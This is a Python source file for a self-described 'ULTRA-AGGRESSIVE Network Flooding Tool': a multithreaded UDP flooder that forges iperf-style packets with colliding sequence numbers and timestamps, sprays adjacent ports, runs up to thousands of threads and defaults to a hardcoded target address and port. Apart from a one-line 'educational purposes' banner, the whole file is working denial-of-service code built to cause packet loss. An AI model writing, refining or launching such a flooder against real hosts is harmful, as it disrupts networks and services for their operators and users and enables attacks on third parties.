import socket
import time
import random
import sys
import threading
from datetime import datetime
import struct
import argparse
import os
import math
import multiprocessing
from concurrent.futures import ThreadPoolExecutor

# Global variables for statistics
packets_sent = 0
bytes_sent = 0
lock = threading.Lock()

def send_packets(target_ip, target_port, packet_size, duration, thread_id=0, multi_target=True):
    """
    Send packets to target with maximum aggression to cause packet loss
    """
    global packets_sent, bytes_sent
    
    # Create a new socket for each thread with maximum performance options
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        # Set socket buffer size to maximum possible for ultra-high performance
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 16777216)  # 16MB buffer
    except:
        pass
    
    # Optimize for absolute maximum packet throughput
    # VASTLY increase packet rates and focus precisely on iperf's protocol
    payload_templates = {}
    
    # Focus exclusively on standard iperf packet size for maximum disruption
    sizes = [1470]  # Attack exclusively with iperf-sized packets
    
    # Generate the exact packet pattern that will collide with legitimate iperf packets
    current_time_sec = int(time.time())
    
    # Create two highly effective packet types: sequence collision and time collision
    # These are specifically designed to interfere with iperf's processing
    for i, size in enumerate(sizes):
        # Type 1: Perfect iperf packet clone that collides with sequence numbers
        seq_header = struct.pack("!I", 0)  # Start with sequence 0 (iperf always starts at 0)
        time_header = struct.pack("!II", current_time_sec & 0xFFFFFFFF, 0)  # Match iperf timestamp format
        
        # Fill with pattern designed to consume bandwidth and cause checksum collisions
        payload_templates[f"seq_{size}"] = seq_header + time_header + os.urandom(size - 12)
        
        # Type 2: Perfect iperf packet with timestamp designed to create sorting issues
        seq_header2 = struct.pack("!I", 1000)  # Use sequence far ahead
        time_header2 = struct.pack("!II", (current_time_sec + 1) & 0xFFFFFFFF, 0)  # Future timestamp
        
        # Create pattern designed to cause buffer overflows
        payload_templates[f"time_{size}"] = seq_header2 + time_header2 + os.urandom(size - 12)
    
    # Target precisely the main port with overwhelming force
    target_ports = [target_port] * 20  # Focus mostly on main port
    if multi_target:
        # Add nearby ports with much less frequency
        for offset in range(1, 3):
            target_ports.append(target_port + offset)
            target_ports.append(target_port - offset)
    
    # Generate a set of sequence numbers to use (important for collision)
    # Target the exact sequence range that legitimate clients will be using
    seq_numbers = list(range(0, 200000, 10))  # Ensure we hit client's sequence numbers
    
    # Ultra-aggressive parameters - no holds barred
    burst_size = 5000  # Massive bursts
    end_time = time.time() + duration
    seq_index = 0
    
    # Main packet sending loop - absolute maximum aggression
    while time.time() < end_time:
        # Send massive packet bursts with no delay whatsoever
        for _ in range(burst_size):
            try:
                # Alternate between sequence and time attacks for maximum impact
                # Update sequence number based on typical iperf patterns
                seq_num = seq_numbers[seq_index % len(seq_numbers)]
                seq_index += 1
                
                # Update the current timestamp for each packet
                current_timestamp = int(time.time())
                
                # Create packet with current timestamp and targeted sequence
                header = struct.pack("!I", seq_num)  # Sequence number (4 bytes)
                header += struct.pack("!II", current_timestamp & 0xFFFFFFFF, random.randint(0, 1000000))  # Timestamp (8 bytes)
                payload = header + b'X' * (1470 - len(header))  # Fill to exact iperf size
                
                # Send to main port with overwhelming probability
                sock.sendto(payload, (target_ip, target_port))
                
                # Update statistics without locking to maximize speed
                packets_sent += 1
                bytes_sent += len(payload)
                
                # Occasionally send extra packet to nearby ports to disrupt control channels
                if random.random() < 0.05 and multi_target:
                    alt_port = target_port + random.randint(-2, 2)
                    if alt_port != target_port:
                        sock.sendto(payload, (target_ip, alt_port))
                        packets_sent += 1
                        bytes_sent += len(payload)
                    
            except:
                # Never stop for errors - absolute maximum throughput
                pass
            
        # Zero delay between bursts - completely saturate the connection
        # This is key for creating packet loss - we must overwhelm the buffers
    
    sock.close()

def thread_creator(target_ip, target_port, packet_size, duration, thread_range, multi_target):
    """Function to create and start a batch of threads"""
    threads = []
    for i in thread_range:
        # Create actual thread for each ID in the range
        thread = threading.Thread(
            target=send_packets,
            args=(target_ip, target_port, packet_size, duration, i, multi_target)
        )
        thread.daemon = True
        threads.append(thread)
        thread.start()
        # Very short delay between thread starts to prevent system overload
        time.sleep(0.01)
    
    # Return threads so they can be tracked if needed
    return threads

def flood_with_threadpool(target_ip, target_port, duration=30, packet_size=1470, num_threads=1000, multi_target=True):
    """
    Flood target using a thread pool executor with thousands of threads
    """
    global packets_sent, bytes_sent
    packets_sent = 0
    bytes_sent = 0
    
    start_time = time.time()
    print(f"[*] Starting MASSIVE flood attack on {target_ip}:{target_port} for {duration} seconds")
    print(f"[*] Using {num_threads} threads with optimized for iperf disruption")
    
    # Use fewer workers but submit more tasks to avoid overhead
    worker_count = min(500, num_threads)
    
    print(f"[*] Initializing thread pool with {worker_count} workers for {num_threads} tasks")
    
    # Create thread pool and submit individual tasks
    with ThreadPoolExecutor(max_workers=worker_count) as executor:
        futures = []
        
        # Submit individual send_packets tasks 
        for i in range(num_threads):
            # Submit the send_packets function directly for each thread ID
            future = executor.submit(
                send_packets,
                target_ip, target_port, packet_size, duration, i, multi_target
            )
            futures.append(future)
            
            if i % 50 == 0:
                print(f"[+] Started {i}/{num_threads} tasks")
                
        print(f"[+] All {num_threads} tasks submitted")
    
    # Monitor and display progress
    monitor_progress(start_time, duration)
    
    # Display final stats
    elapsed_time = time.time() - start_time
    mbytes_sent = bytes_sent / (1024 * 1024)
    print(f"\n[*] Flooding completed.")
    print(f"[*] Sent {packets_sent} packets ({mbytes_sent:.2f} MB) in {elapsed_time:.2f} seconds")
    print(f"[*] Average: {(packets_sent / elapsed_time if elapsed_time > 0 else 0):.2f} pkt/s, {(mbytes_sent*8/elapsed_time if elapsed_time > 0 else 0):.2f} Mbps")

def flood(target_ip, target_port, duration=60, packet_size=1470, num_threads=1000, multi_target=True):
    """
    Ultra-aggressive flooding function designed to maximize packet loss
    """
    global packets_sent, bytes_sent
    
    packets_sent = 0
    bytes_sent = 0
    start_time = time.time()
    
    # Use the maximum number of threads the system can handle
    try:
        # Calculate optimal thread count based on system resources
        cpu_count = multiprocessing.cpu_count()
        memory_gb = os.sysconf('SC_PAGE_SIZE') * os.sysconf('SC_PHYS_PAGES') / (1024.**3)
        
        # Scale thread count based on available resources
        suggested_threads = int(min(cpu_count * 10, memory_gb * 100))
        num_threads = max(num_threads, suggested_threads)
        print(f"[+] System has {cpu_count} CPUs and {memory_gb:.1f}GB RAM")
        print(f"[+] Optimized thread count: {num_threads}")
    except:
        # If detection fails, use default
        pass
    
    print(f"[*] Starting ULTRA-AGGRESSIVE flood on {target_ip}:{target_port}")
    print(f"[*] Attack duration: {duration} seconds with {num_threads} threads")
    print(f"[*] WARNING: This attack will use maximum system resources")
    
    threads = []
    
    # Launch threads in optimal batches for maximum impact
    batch_size = min(50, num_threads // 10)  # Smaller batches but launch quickly
    for batch_start in range(0, num_threads, batch_size):
        batch_end = min(batch_start + batch_size, num_threads)
        print(f"[+] Launching attack batch {batch_start//batch_size + 1}/{(num_threads+batch_size-1)//batch_size}")
        
        # Create and start threads in this batch
        for i in range(batch_start, batch_end):
            thread = threading.Thread(
                target=send_packets,
                args=(target_ip, target_port, packet_size, duration, i, multi_target)
            )
            thread.daemon = True
            threads.append(thread)
            thread.start()
        
        # Very brief pause between batches to prevent thread creation overhead
        time.sleep(0.01)
    
    # Monitor progress
    try:
        last_packets = 0
        last_time = time.time()
        
        while time.time() - start_time < duration:
            time.sleep(0.5)  # Update more frequently
            current_time = time.time()
            elapsed = current_time - start_time
            current_packets = packets_sent
            
            # Calculate packet rate
            interval = current_time - last_time
            if interval > 0:
                pps = (current_packets - last_packets) / interval
                mbps = (pps * packet_size * 8) / 1000000
                
                # Show attack progress
                print(f"\r[*] Attack progress: {elapsed:.1f}s/{duration}s - {pps:.0f} pkt/s ({mbps:.2f} Mbps) - {current_packets} packets sent", end="")
                sys.stdout.flush()
                
                last_packets = current_packets
                last_time = current_time
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    
    # Final statistics
    elapsed_time = time.time() - start_time
    mbytes_sent = bytes_sent / (1024 * 1024)
    print(f"\n[*] Attack completed: {packets_sent} packets ({mbytes_sent:.2f} MB) in {elapsed_time:.2f} seconds")
    print(f"[*] Average rate: {(packets_sent / elapsed_time if elapsed_time > 0 else 0):.2f} pkt/s ({(mbytes_sent*8/elapsed_time):.2f} Mbps)")

def monitor_progress(start_time, duration):
    """Monitor and display attack progress"""
    global packets_sent, bytes_sent
    
    try:
        last_packets = 0
        last_bytes = 0
        last_time = start_time
        no_packets_count = 0;
        
        while time.time() - start_time < duration:
            time.sleep(1)
            current_time = time.time()
            elapsed = current_time - start_time
            current_packets = packets_sent
            current_bytes = bytes_sent
            
            # Calculate rates
            interval = current_time - last_time
            if interval > 0:
                pps = (current_packets - last_packets) / interval
                bps = (current_bytes - last_bytes) * 8 / interval  # bits per second
            else:
                pps = bps = 0
            
            # Check if no packets are being sent
            if current_packets == last_packets:
                no_packets_count += 1
                if no_packets_count >= 3:
                    print("[!] WARNING: No packets have been sent in the last 3 seconds!")
                    print("[!] Check network connection or firewall settings")
            else:
                no_packets_count = 0
            
            # Display progress
            print(f"\r[+] Elapsed: {elapsed:.2f}s, Packets: {current_packets} ({pps:.2f} pkt/s), Bytes: {current_bytes} ({bps:.2f} bps)", end='')
            
            # Update last values
            last_packets = current_packets
            last_bytes = current_bytes
            last_time = current_time
    except KeyboardInterrupt:
        # On interrupt, display final stats
        elapsed_time = time.time() - start_time
        mbytes_sent = bytes_sent / (1024 * 1024)
        print(f"\n[*] Flooding interrupted by user.")
        print(f"[*] Sent {packets_sent} packets ({mbytes_sent:.2f} MB) in {elapsed_time:.2f} seconds")
        print(f"[*] Average: {(packets_sent / elapsed_time if elapsed_time > 0 else 0):.2f} pkt/s, {(mbytes_sent*8/elapsed_time if elapsed_time > 0 else 0):.2f} Mbps")

def main():
    # Create argument parser with ultra-aggressive options
    parser = argparse.ArgumentParser(description='ULTRA-AGGRESSIVE Network Flooding Tool')
    parser.add_argument('-t', '--target', default="140.118.123.107", help='Target IP address')
    parser.add_argument('-p', '--port', type=int, default=5001, help='Target port')
    parser.add_argument('-d', '--duration', type=int, default=30, help='Test duration in seconds (default: 30)')
    parser.add_argument('-n', '--threads', type=int, default=2000, help='Number of threads (default: 2000)')
    parser.add_argument('-m', '--multi-target', action='store_true', default=True, help='Also target nearby ports')

    args = parser.parse_args()
    
    # Launch ultra-aggressive flood attack
    flood(args.target, args.port, args.duration, 1470, args.threads, args.multi_target)

if __name__ == "__main__":
    print("[*] MASSIVE Network Flooding Tool")
    print("[*] For educational purposes only")
    print("[*] WARNING: HIGH THREAD COUNT WILL STRESS YOUR SYSTEM")
    
    # Increase process priority if possible
    if os.geteuid() == 0:
        try:
            import psutil
            process = psutil.Process(os.getpid())
            process.nice(-20)  # Highest priority
            print("[*] Running with maximum process priority")
        except:
            pass
    
    # Check for root privileges
    if os.geteuid() != 0:
        print("[!] Warning: For maximum performance, run with sudo")
    
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Program interrupted by user")
        sys.exit(0)